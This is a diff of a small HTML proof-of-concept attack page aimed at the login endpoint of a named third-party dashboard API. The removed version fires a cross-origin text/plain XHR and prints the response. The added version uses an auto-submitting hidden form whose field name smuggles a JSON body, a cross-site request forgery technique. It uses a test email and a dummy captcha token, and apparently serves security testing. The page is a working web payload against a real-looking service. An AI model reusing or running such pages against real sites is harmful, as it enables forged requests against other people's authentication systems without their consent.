@@ -1,16 +1,8 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-P2</title></head>
-<body><pre id="out">P2-START</pre>
-<script>
-try {
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://dashboard-api.swapped.com/api/v1/auth/login", false);
-  xhr.setRequestHeader("Content-Type", "text/plain");
-  xhr.send(JSON.stringify({ email: "poc-test@swapped.com", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" }));
-  document.title = "ATK-P2-" + xhr.status;
-  document.getElementById("out").textContent = "P2-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 300);
-} catch (e) {
-  document.title = "ATK-P2-ERR";
-  document.getElementById("out").textContent = "P2-ERR " + e.message;
-}
-</script></body></html>
+<html><head><meta charset="utf-8"><title>ATK-F3</title></head>
+<body>
+<form id="f" method="POST" action="https://dashboard-api.swapped.com/api/v1/auth/login" enctype="text/plain">
+<input type="hidden" name='{"email":"poc-test@swapped.com","turnstile_token":"XXXX.DUMMY.TOKEN.XXXX","zzz":"' value='"}'>
+</form>
+<script>document.getElementById('f').submit();</script>
+</body></html>
